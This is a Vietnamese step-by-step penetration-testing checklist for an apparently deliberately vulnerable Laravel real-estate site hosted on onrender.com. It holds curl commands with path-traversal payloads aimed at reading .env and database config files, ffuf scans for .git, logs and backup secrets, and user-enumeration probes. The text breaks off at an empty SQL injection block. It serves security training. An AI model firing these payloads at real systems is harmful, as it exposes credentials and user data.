# üîí T√†i Li·ªáu Ki·ªÉm Th·ª≠ X√¢m Nh·∫≠p (Penetration Testing) - H∆∞·ªõng D·∫´n Tu·∫ßn T·ª±

> **‚ö†Ô∏è C·∫¢NH B√ÅO**: T√†i li·ªáu n√†y m√¥ t·∫£ c√°c l·ªó h·ªïng b·∫£o m·∫≠t ƒë∆∞·ª£c t·∫°o c√≥ ch·ªß √Ω trong m√¥i tr∆∞·ªùng ph√°t tri·ªÉn/test. **KH√îNG BAO GI·ªú** s·ª≠ d·ª•ng c√°c k·ªπ thu·∫≠t n√†y tr√™n h·ªá th·ªëng m√† b·∫°n kh√¥ng c√≥ quy·ªÅn ki·ªÉm th·ª≠.

## üåê Th√¥ng tin m√¥i tr∆∞·ªùng ƒë√£ deploy

- **API Backend**: `https://backend-web-bds.onrender.com/api`
- **Web Frontend**: `https://travel-taynd.onrender.com`
- **Base URL Backend**: `https://backend-web-bds.onrender.com`

## üìä T·ªïng quan 5 l·ªó h·ªïng b·∫£o m·∫≠t

| STT | L·ªó H·ªïng               | M·ª©c ƒê·ªô            | Endpoint                                                                                       | Tr·∫°ng th√°i   |
| --- | --------------------- | ----------------- | ---------------------------------------------------------------------------------------------- | ------------ |
| 1   | User Enumeration      | üî¥ CAO            | `POST /api/auth/forgot_password`                                                               | ‚¨ú Ch∆∞a test |
| 2   | Path Traversal        | üî¥ R·∫§T CAO        | `GET /api/file/download?file=...`                                                              | ‚¨ú Ch∆∞a test |
| 3   | Directory Enumeration | üü° TRUNG B√åNH-CAO | `GET /storage/`, `GET /public/`                                                                | ‚¨ú Ch∆∞a test |
| 4   | SQL Injection         | üî¥ R·∫§T CAO        | `GET /api/properties/detail/{id}`                                                              | ‚¨ú Ch∆∞a test |
| 5   | Reflected XSS         | üî¥ CAO            | `GET /api/search/filter?search_keyword=...` (ch√≠nh) / `GET /api/search/properties?q=...` (ph·ª•) | ‚¨ú Ch∆∞a test |

**H∆∞·ªõng d·∫´n s·ª≠ d·ª•ng**: ƒê√°nh d·∫•u ‚úÖ khi ho√†n th√†nh m·ªói b∆∞·ªõc, ‚ö†Ô∏è khi ph√°t hi·ªán l·ªó h·ªïng, ‚ùå khi kh√¥ng ph√°t hi·ªán.

---

## üêß B∆∞·ªõc 0: Chu·∫©n b·ªã m√¥i tr∆∞·ªùng v√† c√¥ng c·ª•

### Checklist chu·∫©n b·ªã

- [ ] ƒê√£ c√†i ƒë·∫∑t Kali Linux ho·∫∑c m√°y c√≥ c√°c c√¥ng c·ª• pentest
- [ ] ƒê√£ c√≥ quy·ªÅn truy c·∫≠p internet
- [ ] ƒê√£ x√°c nh·∫≠n c√°c URL ƒë√£ deploy ho·∫°t ƒë·ªông

### C√†i ƒë·∫∑t c√¥ng c·ª• tr√™n Kali Linux

```bash
# C·∫≠p nh·∫≠t h·ªá th·ªëng
sudo apt update && sudo apt upgrade -y

# C√†i ƒë·∫∑t c√°c c√¥ng c·ª• pentest c∆° b·∫£n
sudo apt install -y \
    curl \
    ffuf \
    gobuster \
    sqlmap \
    nikto \
    nmap \
    wget

# C√†i ƒë·∫∑t XSStrike (Python tool cho XSS)
cd ~
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
chmod +x xsstrike.py

# Th√™m v√†o PATH (t√πy ch·ªçn)
echo 'export PATH="$HOME/XSStrike:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

### Ki·ªÉm tra k·∫øt n·ªëi ƒë·∫øn h·ªá th·ªëng

```bash
# Test k·∫øt n·ªëi ƒë·∫øn Backend API
curl -k https://backend-web-bds.onrender.com/api/debug

# K·∫øt qu·∫£ mong ƒë·ª£i: {"status":"API is working!"}

# Test k·∫øt n·ªëi ƒë·∫øn Frontend
curl -k -I https://travel-taynd.onrender.com

# K·∫øt qu·∫£ mong ƒë·ª£i: HTTP/2 200
```

**‚úÖ Ho√†n th√†nh B∆∞·ªõc 0 khi**: T·∫•t c·∫£ l·ªánh tr√™n tr·∫£ v·ªÅ k·∫øt qu·∫£ th√†nh c√¥ng.

---

## üîç L·ªó h·ªïng 1: User Enumeration qua Password Reset (Qu√™n m·∫≠t kh·∫©u)

### üìå Th√¥ng tin l·ªó h·ªïng

- **M·ª©c ƒë·ªô nghi√™m tr·ªçng**: üî¥ **CAO**
- **Endpoint**: `POST https://backend-web-bds.onrender.com/api/auth/forgot_password`
- **Ch·ª©c nƒÉng**: ƒê·∫∑t l·∫°i m·∫≠t kh·∫©u (Forgot Password / Qu√™n m·∫≠t kh·∫©u)
- **Rate Limiting**: ‚ö†Ô∏è **3 requests per 5 minutes** - C·∫ßn ch·ªù 5 ph√∫t gi·ªØa c√°c l·∫ßn test
- **M√¥ t·∫£**: Endpoint "Qu√™n m·∫≠t kh·∫©u" tr·∫£ v·ªÅ ph·∫£n h·ªìi kh√°c nhau t√πy email c√≥ t·ªìn t·∫°i hay kh√¥ng, cho ph√©p li·ªát k√™ email ƒë√£ ƒëƒÉng k√Ω trong h·ªá th·ªëng.

### üîÑ Quy tr√¨nh ki·ªÉm th·ª≠ tu·∫ßn t·ª±

#### **‚ö†Ô∏è L∆∞u √Ω tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu: Rate Limiting**

Endpoint n√†y c√≥ **rate limiting: 3 requests per 5 minutes**.

**C√°ch x·ª≠ l√Ω**:

- N·∫øu g·∫∑p HTTP 429 (Too Many Requests), c·∫ßn ch·ªù **5 ph√∫t** tr∆∞·ªõc khi test ti·∫øp
- N√™n test t·ª´ng b∆∞·ªõc m·ªôt, kh√¥ng spam request
- C√≥ th·ªÉ s·ª≠ d·ª•ng script ƒë·ªÉ t·ª± ƒë·ªông ch·ªù gi·ªØa c√°c request

**Ki·ªÉm tra rate limit**:

```bash
# N·∫øu nh·∫≠n ƒë∆∞·ª£c response n√†y, b·∫°n ƒë√£ b·ªã rate limit:
# HTTP Status Code: 429
# {"status":"error","message":"Qu√° nhi·ªÅu y√™u c·∫ßu. Vui l√≤ng th·ª≠ l·∫°i sau 5 ph√∫t."}
```

#### **B∆∞·ªõc 1.1: X√°c ƒë·ªãnh endpoint v√† ph∆∞∆°ng th·ª©c**

```bash
# Ki·ªÉm tra endpoint c√≥ t·ªìn t·∫°i kh√¥ng
curl -X POST https://backend-web-bds.onrender.com/api/auth/forgot_password \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{}' \
  -v
```

**K·∫øt qu·∫£ mong ƒë·ª£i**: Status code 400 ho·∫∑c 422 (thi·∫øu tham s·ªë email)

**Checklist**:

- [ ] Endpoint tr·∫£ v·ªÅ response (kh√¥ng ph·∫£i 404)
- [ ] Endpoint ch·∫•p nh·∫≠n POST request
- [ ] Endpoint y√™u c·∫ßu tham s·ªë email

#### **B∆∞·ªõc 1.2: Test v·ªõi email KH√îNG t·ªìn t·∫°i**

```bash
# G·ª≠i request v·ªõi email ch·∫Øc ch·∫Øn kh√¥ng t·ªìn t·∫°i
curl -X POST https://backend-web-bds.onrender.com/api/auth/forgot_password \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"email": "nonexistent12345@attack-test.com"}' \
  -v \
  -o response_email_not_exists.json

# Xem k·∫øt qu·∫£
cat response_email_not_exists.json
```

**K·∫øt qu·∫£ mong ƒë·ª£i** (n·∫øu c√≥ l·ªó h·ªïng):

- **HTTP Status Code**: 404
- **Response Body**:

```json
{
  "status": "error",
  "message": "Email kh√¥ng t·ªìn t·∫°i trong h·ªá th·ªëng."
}
```

**Ghi ch√∫ k·∫øt qu·∫£**:

- HTTP Status Code: `_______` (v√≠ d·ª•: 404)
- Response Body Status: `_______` (v√≠ d·ª•: "error")
- Response Body Message: `_______` (v√≠ d·ª•: "Email kh√¥ng t·ªìn t·∫°i trong h·ªá th·ªëng.")
- Th·ªùi gian ph·∫£n h·ªìi: `_______` ms

**Checklist**:

- [ ] ƒê√£ g·ª≠i request th√†nh c√¥ng
- [ ] ƒê√£ l∆∞u response v√†o file
- [ ] ƒê√£ ghi ch√∫ c√°c th√¥ng tin tr√™n

#### **B∆∞·ªõc 1.3: Test v·ªõi email C√ì TH·ªÇ t·ªìn t·∫°i**

‚ö†Ô∏è **L∆∞u √Ω**: Endpoint c√≥ rate limiting (3 requests/5 ph√∫t). N·∫øu g·∫∑p l·ªói 429, c·∫ßn ch·ªù 5 ph√∫t tr∆∞·ªõc khi test ti·∫øp.

```bash
# Th·ª≠ v·ªõi c√°c email c√≥ th·ªÉ t·ªìn t·∫°i (admin, test, user ph·ªï bi·∫øn)
curl -X POST https://backend-web-bds.onrender.com/api/auth/forgot_password \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"email": "admin@gmail.com"}' \
  -v \
  -o response_email_exists.json

# Xem k·∫øt qu·∫£
cat response_email_exists.json
```

**K·∫øt qu·∫£ mong ƒë·ª£i** - C√≥ 3 tr∆∞·ªùng h·ª£p:

**Tr∆∞·ªùng h·ª£p 1: Email t·ªìn t·∫°i v√† g·ª≠i email th√†nh c√¥ng**

- **HTTP Status Code**: 200
- **Response Body**:

```json
{
  "status": "success",
  "message": "ƒê∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn email c·ªßa b·∫°n."
}
```

**Tr∆∞·ªùng h·ª£p 2: Email t·ªìn t·∫°i nh∆∞ng c√≥ l·ªói khi g·ª≠i email** ‚ö†Ô∏è **QUAN TR·ªåNG**

- **HTTP Status Code**: 500
- **Response Body**:

```json
{
  "status": "error",
  "message": "L·ªói khi g·ª≠i ƒë∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u."
}
```

**Ph√¢n t√≠ch**: Response n√†y cho th·∫•y email **C√ì T·ªíN T·∫†I** trong h·ªá th·ªëng (v√¨ code ki·ªÉm tra user tr∆∞·ªõc khi g·ª≠i email). ƒê√¢y v·∫´n l√† l·ªó h·ªïng User Enumeration!

**Tr∆∞·ªùng h·ª£p 3: Rate Limit (qu√° nhi·ªÅu request)**

- **HTTP Status Code**: 429
- **Response Body**:

```json
{
  "status": "error",
  "message": "Qu√° nhi·ªÅu y√™u c·∫ßu. Vui l√≤ng th·ª≠ l·∫°i sau 5 ph√∫t."
}
```

**X·ª≠ l√Ω**: Ch·ªù 5 ph√∫t tr∆∞·ªõc khi test ti·∫øp.

**Ghi ch√∫ k·∫øt qu·∫£**:

- HTTP Status Code: `_______` (v√≠ d·ª•: 200, 500, ho·∫∑c 429)
- Response Body Status: `_______` (v√≠ d·ª•: "success" ho·∫∑c "error")
- Response Body Message: `_______` (ghi ch√∫ ƒë·∫ßy ƒë·ªß message)
- Th·ªùi gian ph·∫£n h·ªìi: `_______` ms
- **Tr∆∞·ªùng h·ª£p**: `[Ch·ªçn: 1-Th√†nh c√¥ng / 2-L·ªói g·ª≠i email / 3-Rate limit]`

**Checklist**:

- [ ] ƒê√£ g·ª≠i request th√†nh c√¥ng
- [ ] ƒê√£ l∆∞u response v√†o file
- [ ] ƒê√£ ghi ch√∫ c√°c th√¥ng tin tr√™n

#### **B∆∞·ªõc 1.4: So s√°nh v√† ph√¢n t√≠ch**

```bash
# So s√°nh 2 response
diff response_email_not_exists.json response_email_exists.json

# Ho·∫∑c so s√°nh b·∫±ng jq (n·∫øu c√≥)
jq '.' response_email_not_exists.json
jq '.' response_email_exists.json
```

**B·∫£ng so s√°nh**:

| Ti√™u ch√≠                  | Email kh√¥ng t·ªìn t·∫°i                   | Email t·ªìn t·∫°i (th√†nh c√¥ng)                                   | Email t·ªìn t·∫°i (l·ªói g·ª≠i email)              |
| ------------------------- | ------------------------------------- | ------------------------------------------------------------ | ------------------------------------------ |
| **HTTP Status Code**      | `_______` (404)                       | `_______` (200)                                              | `_______` (500)                            |
| **Response Body Status**  | `_______` ("error")                   | `_______` ("success")                                        | `_______` ("error")                        |
| **Response Body Message** | "Email kh√¥ng t·ªìn t·∫°i trong h·ªá th·ªëng." | "ƒê∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn email c·ªßa b·∫°n." | "L·ªói khi g·ª≠i ƒë∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u." |
| **Th·ªùi gian ph·∫£n h·ªìi**    | `_______` ms                          | `_______` ms                                                 | `_______` ms                               |

**Ph√¢n t√≠ch**:

- [ ] C√≥ s·ª± kh√°c bi·ªát v·ªÅ HTTP Status Code? (C√≥/Kh√¥ng - 404 vs 200/500)
- [ ] C√≥ s·ª± kh√°c bi·ªát v·ªÅ Response Body Message? (C√≥/Kh√¥ng)
  - Email kh√¥ng t·ªìn t·∫°i: "Email kh√¥ng t·ªìn t·∫°i trong h·ªá th·ªëng."
  - Email t·ªìn t·∫°i (th√†nh c√¥ng): "ƒê∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn email c·ªßa b·∫°n."
  - Email t·ªìn t·∫°i (l·ªói g·ª≠i email): "L·ªói khi g·ª≠i ƒë∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u." ‚ö†Ô∏è **V·∫´n l√† l·ªó h·ªïng!**
- [ ] C√≥ s·ª± kh√°c bi·ªát v·ªÅ th·ªùi gian ph·∫£n h·ªìi? (C√≥/Kh√¥ng)

**‚ö†Ô∏è L∆∞u √Ω quan tr·ªçng**:

- N·∫øu nh·∫≠n ƒë∆∞·ª£c message "L·ªói khi g·ª≠i ƒë∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u." (HTTP 500), ƒëi·ªÅu n√†y **V·∫™N X√ÅC NH·∫¨N** email t·ªìn t·∫°i v√¨ code ki·ªÉm tra user tr∆∞·ªõc khi g·ª≠i email.
- Ch·ªâ c√≥ message "Email kh√¥ng t·ªìn t·∫°i trong h·ªá th·ªëng." (HTTP 404) m·ªõi x√°c nh·∫≠n email kh√¥ng t·ªìn t·∫°i.

**K·∫øt lu·∫≠n**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN L·ªñ H·ªîNG**: C√≥ s·ª± kh√°c bi·ªát r√µ r√†ng ‚Üí User Enumeration ƒë∆∞·ª£c x√°c nh·∫≠n
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: Kh√¥ng c√≥ s·ª± kh√°c bi·ªát ‚Üí Endpoint an to√†n

#### **B∆∞·ªõc 1.5: T·∫°o b√°o c√°o**

**Ghi ch√∫ v√†o b√°o c√°o**:

```
=== L·ªñ H·ªîNG 1: USER ENUMERATION ===
Th·ªùi gian test: [Ghi ng√†y gi·ªù]
Tester: [T√™n c·ªßa b·∫°n]

K·∫øt qu·∫£: [‚ö†Ô∏è PH√ÅT HI·ªÜN / ‚ùå KH√îNG PH√ÅT HI·ªÜN]

Chi ti·∫øt:
- Endpoint: POST /api/auth/forgot_password (ƒê·∫∑t l·∫°i m·∫≠t kh·∫©u / Qu√™n m·∫≠t kh·∫©u)
- Rate Limiting: 3 requests per 5 minutes
- Email kh√¥ng t·ªìn t·∫°i: HTTP Status Code ___, Message: ___
- Email t·ªìn t·∫°i (th√†nh c√¥ng): HTTP Status Code ___, Message: ___
- Email t·ªìn t·∫°i (l·ªói g·ª≠i email): HTTP Status Code ___, Message: ___
- S·ª± kh√°c bi·ªát: [M√¥ t·∫£ - v√≠ d·ª•:
  - Email kh√¥ng t·ªìn t·∫°i: HTTP 404, "Email kh√¥ng t·ªìn t·∫°i trong h·ªá th·ªëng."
  - Email t·ªìn t·∫°i: HTTP 200/500, message kh√°c (th√†nh c√¥ng ho·∫∑c l·ªói g·ª≠i email)
  - ‚ö†Ô∏è L∆∞u √Ω: Message "L·ªói khi g·ª≠i ƒë∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u." V·∫™N x√°c nh·∫≠n email t·ªìn t·∫°i!]

M·ª©c ƒë·ªô nghi√™m tr·ªçng: CAO
Khuy·∫øn ngh·ªã: [Xem ph·∫ßn kh·∫Øc ph·ª•c b√™n d∆∞·ªõi]
```

**‚úÖ Ho√†n th√†nh L·ªó h·ªïng 1 khi**: ƒê√£ ho√†n th√†nh t·∫•t c·∫£ checklist tr√™n v√† ghi b√°o c√°o.

---

## üîç L·ªó h·ªïng 2: Path Traversal / Directory Traversal

### üìå Th√¥ng tin l·ªó h·ªïng

- **M·ª©c ƒë·ªô nghi√™m tr·ªçng**: üî¥ **R·∫§T CAO**
- **Endpoint**: `GET https://backend-web-bds.onrender.com/api/file/download?file=<filename>`
- **M√¥ t·∫£**: Endpoint kh√¥ng validate ƒë∆∞·ªùng d·∫´n file, cho ph√©p truy c·∫≠p file ngo√†i th∆∞ m·ª•c cho ph√©p.

### üîÑ Quy tr√¨nh ki·ªÉm th·ª≠ tu·∫ßn t·ª±

#### **B∆∞·ªõc 2.1: X√°c ƒë·ªãnh endpoint**

```bash
# Ki·ªÉm tra endpoint c√≥ t·ªìn t·∫°i kh√¥ng
curl -k "https://backend-web-bds.onrender.com/api/file/download?file=test.txt" \
  -v \
  -o test_download.txt
```

**K·∫øt qu·∫£ mong ƒë·ª£i**:

- N·∫øu endpoint t·ªìn t·∫°i: Status 200 ho·∫∑c 404 (file kh√¥ng t·ªìn t·∫°i)
- N·∫øu endpoint kh√¥ng t·ªìn t·∫°i: Status 404 (route kh√¥ng t·ªìn t·∫°i)

**Checklist**:

- [ ] Endpoint tr·∫£ v·ªÅ response (kh√¥ng ph·∫£i 404 route)
- [ ] Endpoint ch·∫•p nh·∫≠n tham s·ªë `file`

#### **B∆∞·ªõc 2.2: Test Path Traversal c∆° b·∫£n - File .env**

```bash
# Th·ª≠ truy c·∫≠p file .env (ch·ª©a th√¥ng tin nh·∫°y c·∫£m)
curl -k "https://backend-web-bds.onrender.com/api/file/download?file=../../../../.env" \
  -v \
  -o env_file.txt

# Ki·ªÉm tra k·∫øt qu·∫£
cat env_file.txt
```

**K·∫øt qu·∫£ mong ƒë·ª£i n·∫øu th√†nh c√¥ng**:

```
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:...
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_DATABASE=...
DB_USERNAME=...
DB_PASSWORD=...
```

**Ghi ch√∫**:

- [ ] Status Code: `_______`
- [ ] File c√≥ ƒë∆∞·ª£c t·∫£i v·ªÅ kh√¥ng? (C√≥/Kh√¥ng)
- [ ] N·ªôi dung file: `[Ghi ch√∫ n·ªôi dung n·∫øu c√≥]`

**Checklist**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN**: C√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c file .env ‚Üí Path Traversal ƒë∆∞·ª£c x√°c nh·∫≠n
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: Kh√¥ng th·ªÉ ƒë·ªçc file .env

#### **B∆∞·ªõc 2.3: Test Path Traversal - File config**

```bash
# Th·ª≠ truy c·∫≠p file config database
curl -k "https://backend-web-bds.onrender.com/api/file/download?file=../../../config/database.php" \
  -v \
  -o config_database.txt

# Ki·ªÉm tra k·∫øt qu·∫£
head -20 config_database.txt
```

**Ghi ch√∫**:

- [ ] Status Code: `_______`
- [ ] File c√≥ ƒë∆∞·ª£c t·∫£i v·ªÅ kh√¥ng? (C√≥/Kh√¥ng)
- [ ] N·ªôi dung c√≥ ch·ª©a th√¥ng tin nh·∫°y c·∫£m? (C√≥/Kh√¥ng)

#### **B∆∞·ªõc 2.4: Test v·ªõi URL Encoding**

```bash
# S·ª≠ d·ª•ng %2e%2e%2f thay v√¨ ../
curl -k "https://backend-web-bds.onrender.com/api/file/download?file=..%2f..%2f..%2f..%2f.env" \
  -v \
  -o env_encoded.txt

# Ki·ªÉm tra k·∫øt qu·∫£
cat env_encoded.txt
```

**Ghi ch√∫**:

- [ ] URL encoding c√≥ bypass ƒë∆∞·ª£c filter kh√¥ng? (C√≥/Kh√¥ng)

#### **B∆∞·ªõc 2.5: Test endpoint /view**

```bash
# Th·ª≠ endpoint view ƒë·ªÉ ƒë·ªçc n·ªôi dung file tr·ª±c ti·∫øp
curl -k "https://backend-web-bds.onrender.com/api/file/view?file=../../../../.env" \
  -v \
  -o env_view.txt

# Ki·ªÉm tra k·∫øt qu·∫£
cat env_view.txt
```

**Ghi ch√∫**:

- [ ] Endpoint /view c√≥ ho·∫°t ƒë·ªông kh√¥ng? (C√≥/Kh√¥ng)
- [ ] C√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c file nh·∫°y c·∫£m kh√¥ng? (C√≥/Kh√¥ng)

#### **B∆∞·ªõc 2.6: T·∫°o b√°o c√°o**

**Ghi ch√∫ v√†o b√°o c√°o**:

```
=== L·ªñ H·ªîNG 2: PATH TRAVERSAL ===
Th·ªùi gian test: [Ghi ng√†y gi·ªù]
Tester: [T√™n c·ªßa b·∫°n]

K·∫øt qu·∫£: [‚ö†Ô∏è PH√ÅT HI·ªÜN / ‚ùå KH√îNG PH√ÅT HI·ªÜN]

Chi ti·∫øt:
- Endpoint: GET /api/file/download?file=...
- Payload 1 (../../../../.env): [K·∫øt qu·∫£]
- Payload 2 (URL encoded): [K·∫øt qu·∫£]
- Endpoint /view: [K·∫øt qu·∫£]
- File nh·∫°y c·∫£m c√≥ th·ªÉ truy c·∫≠p: [Danh s√°ch file]

M·ª©c ƒë·ªô nghi√™m tr·ªçng: R·∫§T CAO
Khuy·∫øn ngh·ªã: [Xem ph·∫ßn kh·∫Øc ph·ª•c b√™n d∆∞·ªõi]
```

**‚úÖ Ho√†n th√†nh L·ªó h·ªïng 2 khi**: ƒê√£ ho√†n th√†nh t·∫•t c·∫£ checklist tr√™n v√† ghi b√°o c√°o.

---

## üîç L·ªó h·ªïng 3: Directory/Path Enumeration

### üìå Th√¥ng tin l·ªó h·ªïng

- **M·ª©c ƒë·ªô nghi√™m tr·ªçng**: üü° **TRUNG B√åNH-CAO**
- **Endpoints**:
  - `GET https://backend-web-bds.onrender.com/storage/`
  - `GET https://backend-web-bds.onrender.com/public/`
- **M√¥ t·∫£**: Web server cho ph√©p li·ªát k√™ n·ªôi dung th∆∞ m·ª•c, ti·∫øt l·ªô c·∫•u tr√∫c v√† file nh·∫°y c·∫£m.

### üîÑ Quy tr√¨nh ki·ªÉm th·ª≠ tu·∫ßn t·ª±

#### **B∆∞·ªõc 3.1: Ki·ªÉm tra Directory Listing tr√™n /storage**

```bash
# Ki·ªÉm tra xem c√≥ directory listing kh√¥ng
curl -k "https://backend-web-bds.onrender.com/storage/" \
  -v \
  -o storage_listing.html

# Ki·ªÉm tra k·∫øt qu·∫£
cat storage_listing.html | grep -i "index of\|directory listing\|<a href"
```

**K·∫øt qu·∫£ mong ƒë·ª£i n·∫øu c√≥ directory listing**:

- HTML ch·ª©a danh s√°ch file v√† th∆∞ m·ª•c
- C√≥ c√°c link ƒë·∫øn file nh∆∞ `logs/`, `framework/`, `app/`

**Ghi ch√∫**:

- [ ] Status Code: `_______`
- [ ] C√≥ directory listing kh√¥ng? (C√≥/Kh√¥ng)
- [ ] C√≥ th·ªÉ th·∫•y danh s√°ch file/th∆∞ m·ª•c kh√¥ng? (C√≥/Kh√¥ng)

**Checklist**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN**: C√≥ directory listing ‚Üí L·ªó h·ªïng ƒë∆∞·ª£c x√°c nh·∫≠n
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: Kh√¥ng c√≥ directory listing

#### **B∆∞·ªõc 3.2: Ki·ªÉm tra Directory Listing tr√™n /public**

```bash
# Ki·ªÉm tra th∆∞ m·ª•c public
curl -k "https://backend-web-bds.onrender.com/public/" \
  -v \
  -o public_listing.html

# Ki·ªÉm tra k·∫øt qu·∫£
cat public_listing.html | grep -i "index of\|directory listing\|<a href"
```

**Ghi ch√∫**:

- [ ] Status Code: `_______`
- [ ] C√≥ directory listing kh√¥ng? (C√≥/Kh√¥ng)

#### **B∆∞·ªõc 3.3: Qu√©t th∆∞ m·ª•c v·ªõi ffuf (Kali Linux)**

```bash
# T·∫°o th∆∞ m·ª•c l√†m vi·ªác
mkdir -p ~/pentest_results
cd ~/pentest_results

# Qu√©t th∆∞ m·ª•c v·ªõi ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u https://backend-web-bds.onrender.com/FUZZ \
     -t 50 \
     -mc 200,301,302,403 \
     -k \
     -o dir_scan_results.json \
     -of json

# Xem k·∫øt qu·∫£
cat dir_scan_results.json | jq '.results[] | {url: .url, status: .status}'
```

**Ghi ch√∫ c√°c th∆∞ m·ª•c t√¨m ƒë∆∞·ª£c**:

- [ ] Th∆∞ m·ª•c 1: `_______` (Status: `_______`)
- [ ] Th∆∞ m·ª•c 2: `_______` (Status: `_______`)
- [ ] Th∆∞ m·ª•c 3: `_______` (Status: `_______`)

#### **B∆∞·ªõc 3.4: Truy c·∫≠p c√°c th∆∞ m·ª•c nh·∫°y c·∫£m**

```bash
# Th·ª≠ truy c·∫≠p c√°c th∆∞ m·ª•c th∆∞·ªùng c√≥ th√¥ng tin nh·∫°y c·∫£m
curl -k "https://backend-web-bds.onrender.com/storage/logs/" -v -o logs_dir.html
curl -k "https://backend-web-bds.onrender.com/storage/framework/" -v -o framework_dir.html
curl -k "https://backend-web-bds.onrender.com/.git/" -v -o git_dir.html
curl -k "https://backend-web-bds.onrender.com/config/" -v -o config_dir.html
```

**Ghi ch√∫**:

- [ ] `/storage/logs/`: C√≥ th·ªÉ truy c·∫≠p? (C√≥/Kh√¥ng)
- [ ] `/storage/framework/`: C√≥ th·ªÉ truy c·∫≠p? (C√≥/Kh√¥ng)
- [ ] `/.git/`: C√≥ th·ªÉ truy c·∫≠p? (C√≥/Kh√¥ng)
- [ ] `/config/`: C√≥ th·ªÉ truy c·∫≠p? (C√≥/Kh√¥ng)

#### **B∆∞·ªõc 3.5: T√¨m file backup**

```bash
# T·∫°o wordlist file backup
cat > /tmp/backup_files.txt << EOF
.env.backup
.env.old
.env.production
config.php.bak
database.php.backup
web.config.bak
composer.json.bak
EOF

# Qu√©t file backup
ffuf -w /tmp/backup_files.txt \
     -u https://backend-web-bds.onrender.com/FUZZ \
     -mc 200 \
     -k \
     -o backup_files_results.json \
     -of json

# Xem k·∫øt qu·∫£
cat backup_files_results.json | jq '.results[] | {url: .url, status: .status}'
```

**Ghi ch√∫ c√°c file backup t√¨m ƒë∆∞·ª£c**:

- [ ] File backup 1: `_______`
- [ ] File backup 2: `_______`

#### **B∆∞·ªõc 3.6: T·∫°o b√°o c√°o**

**Ghi ch√∫ v√†o b√°o c√°o**:

```
=== L·ªñ H·ªîNG 3: DIRECTORY ENUMERATION ===
Th·ªùi gian test: [Ghi ng√†y gi·ªù]
Tester: [T√™n c·ªßa b·∫°n]

K·∫øt qu·∫£: [‚ö†Ô∏è PH√ÅT HI·ªÜN / ‚ùå KH√îNG PH√ÅT HI·ªÜN]

Chi ti·∫øt:
- /storage/ c√≥ directory listing: [C√≥/Kh√¥ng]
- /public/ c√≥ directory listing: [C√≥/Kh√¥ng]
- Th∆∞ m·ª•c t√¨m ƒë∆∞·ª£c: [Danh s√°ch]
- File backup t√¨m ƒë∆∞·ª£c: [Danh s√°ch]
- Th∆∞ m·ª•c nh·∫°y c·∫£m c√≥ th·ªÉ truy c·∫≠p: [Danh s√°ch]

M·ª©c ƒë·ªô nghi√™m tr·ªçng: TRUNG B√åNH-CAO
Khuy·∫øn ngh·ªã: [Xem ph·∫ßn kh·∫Øc ph·ª•c b√™n d∆∞·ªõi]
```

**‚úÖ Ho√†n th√†nh L·ªó h·ªïng 3 khi**: ƒê√£ ho√†n th√†nh t·∫•t c·∫£ checklist tr√™n v√† ghi b√°o c√°o.

---

## üîç L·ªó h·ªïng 4: SQL Injection

### üìå Th√¥ng tin l·ªó h·ªïng

- **M·ª©c ƒë·ªô nghi√™m tr·ªçng**: üî¥ **R·∫§T CAO**
- **Endpoint**: `GET https://backend-web-bds.onrender.com/api/properties/detail/{id}` (c√≥ l·ªó h·ªïng SQL Injection)
- **M√¥ t·∫£**:
  - Endpoint `/api/properties/detail/{id}` c√≥ l·ªó h·ªïng SQL Injection trong PropertyRepository
  - ID ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o SQL query m√† kh√¥ng ƒë∆∞·ª£c parameterized
  - Payload SQL Injection c√≥ th·ªÉ ƒë∆∞·ª£c ch√®n v√†o path parameter `{id}`
  - Route validation v√† controller validation ƒë√£ ƒë∆∞·ª£c b·ªè ƒë·ªÉ c√≥ th·ªÉ test SQL Injection

### üîÑ Quy tr√¨nh ki·ªÉm th·ª≠ tu·∫ßn t·ª±

#### **B∆∞·ªõc 4.1: Test endpoint c∆° b·∫£n**

```bash
# Test endpoint v·ªõi ID h·ª£p l·ªá
curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1" \
  -H "Accept: application/json"
```

**K·∫øt qu·∫£ mong ƒë·ª£i**: JSON ch·ª©a th√¥ng tin property v·ªõi ID=1

**Ghi ch√∫**:

- [ ] Endpoint ho·∫°t ƒë·ªông? (C√≥/Kh√¥ng)
- [ ] Response c√≥ d·ªØ li·ªáu property kh√¥ng? (C√≥/Kh√¥ng)
- [ ] Status Code: `_______`

**Checklist**:

- [ ] Endpoint ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng v·ªõi ID h·ª£p l·ªá

#### **B∆∞·ªõc 4.2: Test SQL Injection c∆° b·∫£n - Ph√° v·ª° c√∫ ph√°p**

```bash
